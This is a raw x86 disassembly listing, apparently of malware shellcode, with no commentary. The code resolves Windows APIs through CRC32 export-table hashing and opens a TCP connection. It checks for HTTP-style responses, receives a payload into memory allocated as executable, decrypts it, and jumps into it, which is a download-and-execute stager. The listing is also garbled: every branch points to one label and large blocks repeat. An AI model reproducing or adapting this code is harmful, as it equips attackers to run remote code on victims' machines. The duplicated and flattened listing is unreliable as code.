push edi
call [ esi + 0xe9 ]
mov [ esi + 0xaef ] al
mov [ ebp - 0x3cc ] 0xea60
xor ecx ecx
mov [ ebp - 0x1bc ] ecx
cmp [ ebp - 0x5d0 ] 0x3d736b63
jne rwxdata
cmp [ esi + 0xaf5 ] 0x1
jne rwxdata
mov [ ebp - 0x1a4 ] eax
lea eax [ ebp - 0x1a8 ]
push eax
pop [ esi + 0x125 ]
push 0x10
lea eax [ ebp - 0x1a8 ]
push eax
push [ ebp - 0x4 ]
call [ esi + 0x5 ]
or eax eax
jne rwxdata
lea eax [ ebp - 0x2bb ]
push eax
call [ esi + 0x1d ]
or eax eax
jne rwxdata
mov [ ebp - 0x5d0 ] 0x3d736b63
mov [ esi + 0xaef ] 0x1
mov [ ebp - 0x5d0 ] 0x3d707474
mov [ esi + 0xaef ] 0x2
jmp rwxdata
cmp [ esi + 0x18c ] 0xffffffff
jne rwxdata
push [ ebp - 0x4 ]
call [ esi + 0x9 ]
mov [ esi + 0x121 ] 0x0
push [ ebp - 0x3cc ]
call [ esi + 0xa5 ]
add [ ebp - 0x1bc ] 0x1
jmp rwxdata
mov [ ebp - 0x3cc ] 0x2710
cmp [ esi + 0xaef ] 0x0
jle rwxdata
mov eax [ eax + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
jmp rwxdata
jmp rwxdata
push [ ebp - 0x5d0 ]
lea eax [ ebp - 0x2bb ]
push eax
push esi
call [ esi + 0xaf6 ]
test eax eax
je rwxdata
mov [ esi + 0xaf4 ] 0x0
jmp rwxdata
push [ esi + 0x2c1 ]
pop [ esi + 0x18c ]
mov [ esi + 0x2c1 ] 0xffffffff
mov [ esi + 0x8b8 ] 0x1
cmp [ esi + 0xaf4 ] 0x1
jne rwxdata
lea edi [ ebp - 0x4cc ]
xor ecx ecx
mov [ ebp - 0x2c0 ] 0xffffffff
push ecx
call [ esi + 0x15 ]
mov [ ebp - 0x1a6 ] ax
push 0x0
push 0x1
push 0x2
call [ esi + 0x1 ]
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x1a8 ] 0x2
lea eax [ ebp - 0x2bb ]
push eax
call [ esi + 0x19 ]
cmp eax 0xffffffff
jne rwxdata
push esi
call [ esi + 0x11d ]
mov [ ecx + edi ] eax
mov [ ecx + edi + 0x4 ] edx
add ecx 0x8
cmp ecx 0x100
jne rwxdata
push 0x100
push edi
push [ ebp - 0x4 ]
push 0x1
push esi
call [ esi + 0xe5 ]
xor ecx ecx
lea edi [ ebp - 0x3bf ]
push edi
push ecx
lea edi [ esi + 0x2c5 ]
push edi
call [ esi + 0xe9 ]
cmp [ esi + 0xaef ] 0x1
jne rwxdata
mov [ ebp - 0x2c0 ] 0x0
xor ecx ecx
push esi
lea eax [ esi + 0x96b ]
push eax
push edi
push edi
call [ esi + 0x101 ]
add edi 0x10
add ecx 0x1
cmp ecx 0x10
jne rwxdata
push 0x100
lea eax [ ebp - 0x5cc ]
push eax
push [ ebp - 0x4 ]
push 0x0
push esi
call [ esi + 0xe5 ]
push esi
cld
mov ecx 0x40
lea esi [ ebp - 0x4cc ]
lea edi [ ebp - 0x5cc ]
[ esi ] [ edi ]
je rwxdata
call sub_409fad
push ecx
call [ esi + 0x15 ]
lea edi [ ebp - 0x3c7 ]
mov [ edi ] 0x4
mov [ edi + 0x1 ] 0x1
mov [ edi + 0x2 ] ax
lea eax [ ebp - 0x3bf ]
push eax
call [ esi + 0x19 ]
cmp eax 0xffffffff
jne rwxdata
pop esi
push 0x4
lea eax [ ebp - 0x8 ]
push eax
push [ ebp - 0x4 ]
push 0x0
push esi
call [ esi + 0xe5 ]
test eax eax
je rwxdata
pop esi
mov [ ebp - 0x3cc ] 0x7530
jmp rwxdata
mov [ edi + 0x4 ] eax
mov [ edi + 0x8 ] 0x0
push 0x9
push edi
push [ ebp - 0x4 ]
push 0x1
push esi
call [ esi + 0xe5 ]
test eax eax
je rwxdata
lea eax [ ebp - 0x3bf ]
push eax
call [ esi + 0x1d ]
test eax eax
je rwxdata
push 0x40
push 0x1000
push [ ebp - 0x8 ]
push 0x0
call [ esi + 0x21 ]
mov edi eax
push [ ebp - 0x8 ]
push eax
push [ ebp - 0x4 ]
push 0x0
push esi
call [ esi + 0xe5 ]
or eax eax
jne rwxdata
push 0x8
push edi
push [ ebp - 0x4 ]
push 0x0
push esi
call [ esi + 0xe5 ]
test eax eax
je rwxdata
add [ ebp - 0x2c0 ] 0x1
mov ecx [ ebp - 0x2c0 ]
cmp ecx [ esi + 0x2c1 ]
jbe rwxdata
mov eax [ eax + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
push edi
mov ecx [ ebp - 0x8 ]
push 0x8000
push 0x0
push edi
call [ esi + 0x25 ]
jmp rwxdata
cmp [ edi + 0x1 ] 0x5a
je rwxdata
push esi
lea eax [ esi + 0x96b ]
push eax
push edi
push edi
call [ esi + 0x105 ]
add edi 0x10
sub ecx 0x10
jne rwxdata
pop edi
push edi
push [ ebp - 0x4 ]
pop [ esi + 0x121 ]
push esi
call edi
pop edi
push 0x8000
push 0x0
push edi
call [ esi + 0x25 ]
cmp [ esi + 0xaf4 ] 0x0
je rwxdata
jmp rwxdata
sub_409c65
pop eax
push eax
call [ esi + 0x9d ]
mov [ esi + 0xac3 ] eax
call sub_409cb2
loope rwxdata
retn
mov ah 0x8e
add [ eax ] eax
rol [ ecx + 0x29 ] 0x1
jl rwxdata
jo rwxdata
add [ esi ] bl
mov ebx 0x1965ec
or al 0x58
in eax dx
0x2d81001d 0x5f7e
jmp rwxdata
or eax 0x3ce88a00
jpe sub_409cb2
cmp [ edi ] 0x0
je rwxdata
add ch al
int 0xc6
sbb al 0x9
add bh dl
fild [ 0x9949 ]
add [ eax ] al
add [ edi - 0x7d ] bl
aas
add [ ebx + ebx - 0x1 ] dh
aaa
push 0xbba4d88f
push [ esi + 0xac3 ]
push eax
call [ esi + 0xdd ]
lea ecx [ ebp - 0x196 ]
push ecx
push 0x101
call eax
test eax eax
jne rwxdata
push [ esi + 0xac3 ]
push eax
call [ esi + 0xdd ]
movzx edx [ edi + 0x4 ]
mov [ edx + esi ] eax
add edi 0x6
push [ edi ]
leave
retn 0x4
mov [ ebp - 0x3cc ] 0x2710
cmp [ esi + 0xaf4 ] 0x1
jne rwxdata
mov [ ebp - 0x1bc ] 0x0
cmp [ esi + 0x2c1 ] 0xffffffff
jne rwxdata
mov ecx [ ebp - 0x1bc ]
cmp ecx [ esi + 0x18c ]
jbe rwxdata
cmp [ ebp - 0x1bc ] 0x2
jne rwxdata
push [ esi + 0x18c ]
pop [ esi + 0x2c1 ]
push 0x131
lea eax [ esi + 0x190 ]
push eax
lea eax [ esi + 0x2c5 ]
push eax
call [ esi + 0xa9 ]
mov [ esi + 0x18c ] 0xffffffff
lea edi [ ebp - 0x2bb ]
push edi
push ecx
lea edi [ esi + 0x190 ]
push edi
call [ esi + 0xe9 ]
mov [ esi + 0xaef ] al
mov [ ebp - 0x3cc ] 0xea60
xor ecx ecx
mov [ ebp - 0x1bc ] ecx
cmp [ ebp - 0x5d0 ] 0x3d736b63
jne rwxdata
cmp [ esi + 0xaf5 ] 0x1
jne rwxdata
mov [ ebp - 0x1a4 ] eax
lea eax [ ebp - 0x1a8 ]
push eax
pop [ esi + 0x125 ]
push 0x10
lea eax [ ebp - 0x1a8 ]
push eax
push [ ebp - 0x4 ]
call [ esi + 0x5 ]
or eax eax
jne rwxdata
lea eax [ ebp - 0x2bb ]
push eax
call [ esi + 0x1d ]
or eax eax
jne rwxdata
mov [ ebp - 0x5d0 ] 0x3d736b63
mov [ esi + 0xaef ] 0x1
mov [ ebp - 0x5d0 ] 0x3d707474
mov [ esi + 0xaef ] 0x2
jmp rwxdata
cmp [ esi + 0x18c ] 0xffffffff
jne rwxdata
push [ ebp - 0x4 ]
call [ esi + 0x9 ]
mov [ esi + 0x121 ] 0x0
push [ ebp - 0x3cc ]
call [ esi + 0xa5 ]
add [ ebp - 0x1bc ] 0x1
jmp rwxdata
mov [ ebp - 0x3cc ] 0x2710
cmp [ esi + 0xaef ] 0x0
jle rwxdata
mov eax [ eax + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
jmp rwxdata
jmp rwxdata
push [ ebp - 0x5d0 ]
lea eax [ ebp - 0x2bb ]
push eax
push esi
call [ esi + 0xaf6 ]
test eax eax
je rwxdata
mov [ esi + 0xaf4 ] 0x0
jmp rwxdata
push [ esi + 0x2c1 ]
pop [ esi + 0x18c ]
mov [ esi + 0x2c1 ] 0xffffffff
mov [ esi + 0x8b8 ] 0x1
cmp [ esi + 0xaf4 ] 0x1
jne rwxdata
lea edi [ ebp - 0x4cc ]
xor ecx ecx
mov [ ebp - 0x2c0 ] 0xffffffff
push ecx
call [ esi + 0x15 ]
mov [ ebp - 0x1a6 ] ax
push 0x0
push 0x1
push 0x2
call [ esi + 0x1 ]
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x1a8 ] 0x2
lea eax [ ebp - 0x2bb ]
push eax
call [ esi + 0x19 ]
cmp eax 0xffffffff
jne rwxdata
push esi
call [ esi + 0x11d ]
mov [ ecx + edi ] eax
mov [ ecx + edi + 0x4 ] edx
add ecx 0x8
cmp ecx 0x100
jne rwxdata
push 0x100
push edi
push [ ebp - 0x4 ]
push 0x1
push esi
call [ esi + 0xe5 ]
xor ecx ecx
lea edi [ ebp - 0x3bf ]
push edi
push ecx
lea edi [ esi + 0x2c5 ]
push edi
call [ esi + 0xe9 ]
cmp [ esi + 0xaef ] 0x1
jne rwxdata
mov [ ebp - 0x2c0 ] 0x0
xor ecx ecx
push esi
lea eax [ esi + 0x96b ]
push eax
push edi
push edi
call [ esi + 0x101 ]
add edi 0x10
add ecx 0x1
cmp ecx 0x10
jne rwxdata
push 0x100
lea eax [ ebp - 0x5cc ]
push eax
push [ ebp - 0x4 ]
push 0x0
push esi
call [ esi + 0xe5 ]
push esi
cld
mov ecx 0x40
lea esi [ ebp - 0x4cc ]
lea edi [ ebp - 0x5cc ]
[ esi ] [ edi ]
je rwxdata
call sub_409fad
push ecx
call [ esi + 0x15 ]
lea edi [ ebp - 0x3c7 ]
mov [ edi ] 0x4
mov [ edi + 0x1 ] 0x1
mov [ edi + 0x2 ] ax
lea eax [ ebp - 0x3bf ]
push eax
call [ esi + 0x19 ]
cmp eax 0xffffffff
jne rwxdata
pop esi
push 0x4
lea eax [ ebp - 0x8 ]
push eax
push [ ebp - 0x4 ]
push 0x0
push esi
call [ esi + 0xe5 ]
test eax eax
je rwxdata
pop esi
mov [ ebp - 0x3cc ] 0x7530
jmp rwxdata
mov [ edi + 0x4 ] eax
mov [ edi + 0x8 ] 0x0
push 0x9
push edi
push [ ebp - 0x4 ]
push 0x1
push esi
call [ esi + 0xe5 ]
test eax eax
je rwxdata
lea eax [ ebp - 0x3bf ]
push eax
call [ esi + 0x1d ]
test eax eax
je rwxdata
push 0x40
push 0x1000
push [ ebp - 0x8 ]
push 0x0
call [ esi + 0x21 ]
mov edi eax
push [ ebp - 0x8 ]
push eax
push [ ebp - 0x4 ]
push 0x0
push esi
call [ esi + 0xe5 ]
or eax eax
jne rwxdata
push 0x8
push edi
push [ ebp - 0x4 ]
push 0x0
push esi
call [ esi + 0xe5 ]
test eax eax
je rwxdata
add [ ebp - 0x2c0 ] 0x1
mov ecx [ ebp - 0x2c0 ]
cmp ecx [ esi + 0x2c1 ]
jbe rwxdata
mov eax [ eax + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
push edi
mov ecx [ ebp - 0x8 ]
push 0x8000
push 0x0
push edi
call [ esi + 0x25 ]
jmp rwxdata
cmp [ edi + 0x1 ] 0x5a
je rwxdata
push esi
lea eax [ esi + 0x96b ]
push eax
push edi
push edi
call [ esi + 0x105 ]
add edi 0x10
sub ecx 0x10
jne rwxdata
pop edi
push edi
push [ ebp - 0x4 ]
pop [ esi + 0x121 ]
push esi
call edi
pop edi
push 0x8000
push 0x0
push edi
call [ esi + 0x25 ]
cmp [ esi + 0xaf4 ] 0x0
je rwxdata
jmp rwxdata
sub_409cb2
pop edi
push 0xbba4d88f
push [ esi + 0xac3 ]
push eax
call [ esi + 0xdd ]
lea ecx [ ebp - 0x196 ]
push ecx
push 0x101
call eax
test eax eax
jne rwxdata
push [ edi ]
push [ esi + 0xac3 ]
push eax
call [ esi + 0xdd ]
movzx edx [ edi + 0x4 ]
mov [ edx + esi ] eax
add edi 0x6
jmp rwxdata
leave
retn 0x4
mov [ ebp - 0x3cc ] 0x2710
cmp [ esi + 0xaf4 ] 0x1
jne rwxdata
cmp [ edi ] 0x0
je rwxdata
mov [ ebp - 0x1bc ] 0x0
cmp [ esi + 0x2c1 ] 0xffffffff
jne rwxdata
mov ecx [ ebp - 0x1bc ]
cmp ecx [ esi + 0x18c ]
jbe rwxdata
cmp [ ebp - 0x1bc ] 0x2
jne rwxdata
push [ esi + 0x18c ]
pop [ esi + 0x2c1 ]
push 0x131
lea eax [ esi + 0x190 ]
push eax
lea eax [ esi + 0x2c5 ]
push eax
call [ esi + 0xa9 ]
mov [ esi + 0x18c ] 0xffffffff
lea edi [ ebp - 0x2bb ]
push edi
push ecx
lea edi [ esi + 0x190 ]
push edi
call [ esi + 0xe9 ]
mov [ esi + 0xaef ] al
mov [ ebp - 0x3cc ] 0xea60
xor ecx ecx
mov [ ebp - 0x1bc ] ecx
cmp [ ebp - 0x5d0 ] 0x3d736b63
jne rwxdata
cmp [ esi + 0xaf5 ] 0x1
jne rwxdata
mov [ ebp - 0x1a4 ] eax
lea eax [ ebp - 0x1a8 ]
push eax
pop [ esi + 0x125 ]
push 0x10
lea eax [ ebp - 0x1a8 ]
push eax
push [ ebp - 0x4 ]
call [ esi + 0x5 ]
or eax eax
jne rwxdata
lea eax [ ebp - 0x2bb ]
push eax
call [ esi + 0x1d ]
or eax eax
jne rwxdata
mov [ ebp - 0x5d0 ] 0x3d736b63
mov [ esi + 0xaef ] 0x1
mov [ ebp - 0x5d0 ] 0x3d707474
mov [ esi + 0xaef ] 0x2
jmp rwxdata
cmp [ esi + 0x18c ] 0xffffffff
jne rwxdata
push [ ebp - 0x4 ]
call [ esi + 0x9 ]
mov [ esi + 0x121 ] 0x0
push [ ebp - 0x3cc ]
call [ esi + 0xa5 ]
add [ ebp - 0x1bc ] 0x1
jmp rwxdata
mov [ ebp - 0x3cc ] 0x2710
cmp [ esi + 0xaef ] 0x0
jle rwxdata
mov eax [ eax + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
jmp rwxdata
jmp rwxdata
push [ ebp - 0x5d0 ]
lea eax [ ebp - 0x2bb ]
push eax
push esi
call [ esi + 0xaf6 ]
test eax eax
je rwxdata
mov [ esi + 0xaf4 ] 0x0
jmp rwxdata
push [ esi + 0x2c1 ]
pop [ esi + 0x18c ]
mov [ esi + 0x2c1 ] 0xffffffff
mov [ esi + 0x8b8 ] 0x1
cmp [ esi + 0xaf4 ] 0x1
jne rwxdata
lea edi [ ebp - 0x4cc ]
xor ecx ecx
mov [ ebp - 0x2c0 ] 0xffffffff
push ecx
call [ esi + 0x15 ]
mov [ ebp - 0x1a6 ] ax
push 0x0
push 0x1
push 0x2
call [ esi + 0x1 ]
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x1a8 ] 0x2
lea eax [ ebp - 0x2bb ]
push eax
call [ esi + 0x19 ]
cmp eax 0xffffffff
jne rwxdata
push esi
call [ esi + 0x11d ]
mov [ ecx + edi ] eax
mov [ ecx + edi + 0x4 ] edx
add ecx 0x8
cmp ecx 0x100
jne rwxdata
push 0x100
push edi
push [ ebp - 0x4 ]
push 0x1
push esi
call [ esi + 0xe5 ]
xor ecx ecx
lea edi [ ebp - 0x3bf ]
push edi
push ecx
lea edi [ esi + 0x2c5 ]
push edi
call [ esi + 0xe9 ]
cmp [ esi + 0xaef ] 0x1
jne rwxdata
mov [ ebp - 0x2c0 ] 0x0
xor ecx ecx
push esi
lea eax [ esi + 0x96b ]
push eax
push edi
push edi
call [ esi + 0x101 ]
add edi 0x10
add ecx 0x1
cmp ecx 0x10
jne rwxdata
push 0x100
lea eax [ ebp - 0x5cc ]
push eax
push [ ebp - 0x4 ]
push 0x0
push esi
call [ esi + 0xe5 ]
push esi
cld
mov ecx 0x40
lea esi [ ebp - 0x4cc ]
lea edi [ ebp - 0x5cc ]
[ esi ] [ edi ]
je rwxdata
call sub_409fad
push ecx
call [ esi + 0x15 ]
lea edi [ ebp - 0x3c7 ]
mov [ edi ] 0x4
mov [ edi + 0x1 ] 0x1
mov [ edi + 0x2 ] ax
lea eax [ ebp - 0x3bf ]
push eax
call [ esi + 0x19 ]
cmp eax 0xffffffff
jne rwxdata
pop esi
push 0x4
lea eax [ ebp - 0x8 ]
push eax
push [ ebp - 0x4 ]
push 0x0
push esi
call [ esi + 0xe5 ]
test eax eax
je rwxdata
pop esi
mov [ ebp - 0x3cc ] 0x7530
jmp rwxdata
mov [ edi + 0x4 ] eax
mov [ edi + 0x8 ] 0x0
push 0x9
push edi
push [ ebp - 0x4 ]
push 0x1
push esi
call [ esi + 0xe5 ]
test eax eax
je rwxdata
lea eax [ ebp - 0x3bf ]
push eax
call [ esi + 0x1d ]
test eax eax
je rwxdata
push 0x40
push 0x1000
push [ ebp - 0x8 ]
push 0x0
call [ esi + 0x21 ]
mov edi eax
push [ ebp - 0x8 ]
push eax
push [ ebp - 0x4 ]
push 0x0
push esi
call [ esi + 0xe5 ]
or eax eax
jne rwxdata
push 0x8
push edi
push [ ebp - 0x4 ]
push 0x0
push esi
call [ esi + 0xe5 ]
test eax eax
je rwxdata
add [ ebp - 0x2c0 ] 0x1
mov ecx [ ebp - 0x2c0 ]
cmp ecx [ esi + 0x2c1 ]
jbe rwxdata
mov eax [ eax + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
push edi
mov ecx [ ebp - 0x8 ]
push 0x8000
push 0x0
push edi
call [ esi + 0x25 ]
jmp rwxdata
cmp [ edi + 0x1 ] 0x5a
je rwxdata
push esi
lea eax [ esi + 0x96b ]
push eax
push edi
push edi
call [ esi + 0x105 ]
add edi 0x10
sub ecx 0x10
jne rwxdata
pop edi
push edi
push [ ebp - 0x4 ]
pop [ esi + 0x121 ]
push esi
call edi
pop edi
push 0x8000
push 0x0
push edi
call [ esi + 0x25 ]
cmp [ esi + 0xaf4 ] 0x0
je rwxdata
jmp rwxdata
sub_409fad
pop edx
lea edi [ ebp - 0x4cc ]
lea ebx [ ebp - 0x3bf ]
push 0xa10a30b6
push [ esi + 0xabf ]
push [ esi + 0xe1 ]
call [ esi + 0xdd ]
push ecx
push ebx
push edx
push edi
call eax
push eax
push edi
push [ ebp - 0x4 ]
push 0x1
push esi
call [ esi + 0xe5 ]
test eax eax
je rwxdata
push [ ebp - 0x4 ]
call [ esi + 0x9 ]
mov [ esi + 0x121 ] 0x0
push [ ebp - 0x3cc ]
call [ esi + 0xa5 ]
add [ ebp - 0x1bc ] 0x1
jmp rwxdata
add edi 0x4
push edi
mov [ esi + 0x8b8 ] 0x1
cmp [ esi + 0xaf4 ] 0x1
jne rwxdata
add edi 0x1
jmp rwxdata
jmp rwxdata
mov ecx [ ebp - 0x1bc ]
cmp ecx [ esi + 0x18c ]
jbe rwxdata
cmp [ ebp - 0x1bc ] 0x2
jne rwxdata
push 0x1
push edi
push [ ebp - 0x4 ]
push 0x0
push esi
call [ esi + 0xe5 ]
cmp [ edi - 0x3 ] 0xa0d0a0d
jne rwxdata
pop edi
cmp [ edi ] 0x20333035
je rwxdata
lea edi [ ebp - 0x2bb ]
push edi
push ecx
lea edi [ esi + 0x190 ]
push edi
call [ esi + 0xe9 ]
mov [ esi + 0xaef ] al
mov [ ebp - 0x3cc ] 0xea60
xor ecx ecx
mov [ ebp - 0x1bc ] ecx
cmp [ ebp - 0x5d0 ] 0x3d736b63
jne rwxdata
cmp [ esi + 0xaf5 ] 0x1
jne rwxdata
add [ ebp - 0x2c0 ] 0x1
mov ecx [ ebp - 0x2c0 ]
cmp ecx [ esi + 0x2c1 ]
jbe rwxdata
cmp [ edi + 0x9 ] 0x20303032
jne rwxdata
mov [ ebp - 0x1a4 ] eax
lea eax [ ebp - 0x1a8 ]
push eax
pop [ esi + 0x125 ]
push 0x10
lea eax [ ebp - 0x1a8 ]
push eax
push [ ebp - 0x4 ]
call [ esi + 0x5 ]
or eax eax
jne rwxdata
lea eax [ ebp - 0x2bb ]
push eax
call [ esi + 0x1d ]
or eax eax
jne rwxdata
mov [ ebp - 0x5d0 ] 0x3d736b63
mov [ esi + 0xaef ] 0x1
mov [ ebp - 0x5d0 ] 0x3d707474
mov [ esi + 0xaef ] 0x2
jmp rwxdata
cmp [ esi + 0x18c ] 0xffffffff
jne rwxdata
lea edi [ ebp - 0x3bf ]
push edi
push ecx
lea edi [ esi + 0x2c5 ]
push edi
call [ esi + 0xe9 ]
cmp [ esi + 0xaef ] 0x1
jne rwxdata
mov [ ebp - 0x2c0 ] 0x0
xor ecx ecx
lea edi [ ebp - 0x4cc ]
xor ecx ecx
mov [ ebp - 0x3cc ] 0x2710
cmp [ esi + 0xaef ] 0x0
jle rwxdata
mov eax [ eax + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
jmp rwxdata
jmp rwxdata
push [ ebp - 0x5d0 ]
lea eax [ ebp - 0x2bb ]
push eax
push esi
call [ esi + 0xaf6 ]
test eax eax
je rwxdata
mov [ esi + 0xaf4 ] 0x0
jmp rwxdata
push [ esi + 0x2c1 ]
pop [ esi + 0x18c ]
mov [ esi + 0x2c1 ] 0xffffffff
call sub_409fad
push ecx
call [ esi + 0x15 ]
lea edi [ ebp - 0x3c7 ]
mov [ edi ] 0x4
mov [ edi + 0x1 ] 0x1
mov [ edi + 0x2 ] ax
lea eax [ ebp - 0x3bf ]
push eax
call [ esi + 0x19 ]
cmp eax 0xffffffff
jne rwxdata
push esi
call [ esi + 0x11d ]
mov [ ecx + edi ] eax
mov [ ecx + edi + 0x4 ] edx
add ecx 0x8
cmp ecx 0x100
jne rwxdata
push 0x100
push edi
push [ ebp - 0x4 ]
push 0x1
push esi
call [ esi + 0xe5 ]
xor ecx ecx
mov [ ebp - 0x2c0 ] 0xffffffff
push ecx
call [ esi + 0x15 ]
mov [ ebp - 0x1a6 ] ax
push 0x0
push 0x1
push 0x2
call [ esi + 0x1 ]
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x1a8 ] 0x2
lea eax [ ebp - 0x2bb ]
push eax
call [ esi + 0x19 ]
cmp eax 0xffffffff
jne rwxdata
mov [ ebp - 0x1bc ] 0x0
mov [ edi + 0x4 ] eax
mov [ edi + 0x8 ] 0x0
push 0x9
push edi
push [ ebp - 0x4 ]
push 0x1
push esi
call [ esi + 0xe5 ]
test eax eax
je rwxdata
lea eax [ ebp - 0x3bf ]
push eax
call [ esi + 0x1d ]
test eax eax
je rwxdata
push esi
lea eax [ esi + 0x96b ]
push eax
push edi
push edi
call [ esi + 0x101 ]
add edi 0x10
add ecx 0x1
cmp ecx 0x10
jne rwxdata
push 0x100
lea eax [ ebp - 0x5cc ]
push eax
push [ ebp - 0x4 ]
push 0x0
push esi
call [ esi + 0xe5 ]
push esi
cld
mov ecx 0x40
lea esi [ ebp - 0x4cc ]
lea edi [ ebp - 0x5cc ]
[ esi ] [ edi ]
je rwxdata
push 0x8
push edi
push [ ebp - 0x4 ]
push 0x0
push esi
call [ esi + 0xe5 ]
test eax eax
je rwxdata
mov eax [ eax + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
pop esi
push 0x4
lea eax [ ebp - 0x8 ]
push eax
push [ ebp - 0x4 ]
push 0x0
push esi
call [ esi + 0xe5 ]
test eax eax
je rwxdata
pop esi
mov [ ebp - 0x3cc ] 0x7530
jmp rwxdata
cmp [ edi + 0x1 ] 0x5a
je rwxdata
push 0x40
push 0x1000
push [ ebp - 0x8 ]
push 0x0
call [ esi + 0x21 ]
mov edi eax
push [ ebp - 0x8 ]
push eax
push [ ebp - 0x4 ]
push 0x0
push esi
call [ esi + 0xe5 ]
or eax eax
jne rwxdata
cmp [ esi + 0xaf4 ] 0x0
je rwxdata
push edi
mov ecx [ ebp - 0x8 ]
push 0x8000
push 0x0
push edi
call [ esi + 0x25 ]
jmp rwxdata
jmp rwxdata
push esi
lea eax [ esi + 0x96b ]
push eax
push edi
push edi
call [ esi + 0x105 ]
add edi 0x10
sub ecx 0x10
jne rwxdata
pop edi
push edi
push [ ebp - 0x4 ]
pop [ esi + 0x121 ]
push esi
call edi
pop edi
push 0x8000
push 0x0
push edi
call [ esi + 0x25 ]
sub_40a161
push ebp
mov ebp esp
push esi
push edi
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
xor edx edx
xor eax eax
mov ecx eax
add esi eax
add esi 0x3
add edx 0x1
jmp rwxdata
mov [ edi ] 0x0
movzx eax [ esi ]
movzx ecx [ esi + 0x1 ]
pop edi
pop esi
leave
retn 0xc
mov al [ esi ]
mov [ edi ] al
add esi 0x1
add edi 0x1
sub ecx 0x1
jmp rwxdata
mov al [ esi ]
add esi 0x1
cmp ecx edx
je rwxdata
cmp ecx 0x0
je rwxdata
sub_40a1ac
push ebp
mov ebp esp
add esp 0xfffffeec
pushad
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x10c ] 0x1
push [ ebp + 0x10 ]
pop [ ebp - 0x108 ]
mov [ ebp - 0x114 ] 0xb4
mov [ ebp - 0x110 ] 0x0
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] eax
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
cmp [ ebp + 0xc ] 0x0
jne rwxdata
lea eax [ ebp - 0x114 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x10c ]
push eax
push 0x0
call [ esi + 0x99 ]
cmp eax 0x0
jbe rwxdata
call [ esi + 0xd ]
call [ esi + 0x11 ]
jmp rwxdata
popad
xor eax eax
leave
retn 0x14
add [ ebp + 0x14 ] eax
add [ ebp - 0x8 ] eax
sub [ ebp + 0x18 ] eax
cmp [ ebp + 0x18 ] 0x0
jne rwxdata
cmp eax 0x1
jge rwxdata
cmp [ ebp + 0xc ] 0x0
jne rwxdata
popad
mov eax [ ebp - 0x8 ]
leave
retn 0x14
sub_40a249
push ebp
mov ebp esp
add esp 0xffffffec
push esi
push ebx
push edi
push edx
push ecx
mov eax [ ebp + 0x10 ]
xor edx edx
xchg edx eax
mov esi 0x3c
add esi [ ebp + 0xc ]
mov eax [ esi ]
add eax [ ebp + 0xc ]
mov esi [ eax + 0x78 ]
add esi 0x18
add esi [ ebp + 0xc ]
mov eax [ esi ]
mov [ ebp - 0x14 ] eax
add esi 0x4
lea edi [ ebp - 0x8 ]
lodsd [ esi ]
add eax [ ebp + 0xc ]
stosd [ edi ]
mov [ ebp - 0x8 ] eax
lodsd [ esi ]
add eax [ ebp + 0xc ]
push eax
stosd [ edi ]
mov [ ebp - 0xc ] eax
mov eax [ esi ]
add eax [ ebp + 0xc ]
mov [ ebp - 0x10 ] eax
pop esi
mov [ ebp - 0x4 ] 0x0
push esi
mov eax [ esi ]
add eax [ ebp + 0xc ]
xchg edi eax
mov ebx edi
push edi
xor al al
xor eax eax
pop ecx
pop edx
pop edi
pop ebx
pop esi
leave
retn 0xc
scasb [ edi ]
jne rwxdata
pop esi
sub edi ebx
push edx
cld
xor ecx ecx
dec ecx
mov edx ecx
dec dh
jne rwxdata
xor ax 0x8320
xor bx 0xedb8
shr bx 0x1
rcr ax 0x1
jae rwxdata
xor ecx eax
xor edx ebx
dec edi
jne rwxdata
xor eax eax
xor ebx ebx
lodsb [ esi ]
xor al cl
mov cl ch
mov ch dl
mov dl dh
mov dh 0x8
not edx
not ecx
mov eax edx
rol eax 0x10
mov ax cx
pop edx
cmp edx eax
je rwxdata
pop esi
mov eax [ ebp - 0x4 ]
shl eax 0x1
add eax [ ebp - 0x10 ]
xor esi esi
xchg esi eax
mov ax [ esi ]
shl ax 0x2
add eax [ ebp - 0x8 ]
xchg esi eax
mov eax [ esi ]
add eax [ ebp + 0xc ]
pop ecx
pop edx
pop edi
pop ebx
pop esi
leave
retn 0xc
pop esi
add esi 0x4
add [ ebp - 0x4 ] 0x1
jmp rwxdata
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x14 ] eax
jne rwxdata
sub_40a335
push ebp
mov ebp esp
pushad
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
add edi 0x40
mov ecx 0x8
cld
[ edi ] [ esi ]
mov eax [ edi - 0x20 ]
mov ebx [ edi - 0x1c ]
xor eax [ edi - 0x10 ]
xor ebx [ edi - 0xc ]
mov [ edi ] eax
mov [ edi + 0x4 ] ebx
mov eax [ edi - 0x18 ]
mov ebx [ edi - 0x14 ]
xor eax [ edi - 0x8 ]
xor ebx [ edi - 0x4 ]
mov [ edi + 0x8 ] eax
mov [ edi + 0xc ] ebx
mov esi edi
call sub_40a3a4
mov al [ 0x3b7f669e ]
int3
sub_40a3a4
pop ebp
add edi 0x8
mov eax [ esp + 0x30 ]
mov ebx [ eax + 0x111 ]
call [ eax + 0x109 ]
add ebp 0x8
xchg edi esi
mov eax [ esp + 0x30 ]
call [ eax + 0x109 ]
mov eax [ edi - 0x20 ]
mov edx [ edi - 0x1c ]
xor [ edi ] eax
xor [ edi + 0x4 ] edx
mov eax [ edi - 0x18 ]
mov edx [ edi - 0x14 ]
xor [ edi + 0x8 ] eax
xor [ edi + 0xc ] edx
add ebp 0x8
xchg edi esi
mov eax [ esp + 0x30 ]
call [ eax + 0x109 ]
add ebp 0x8
xchg edi esi
mov eax [ esp + 0x30 ]
call [ eax + 0x109 ]
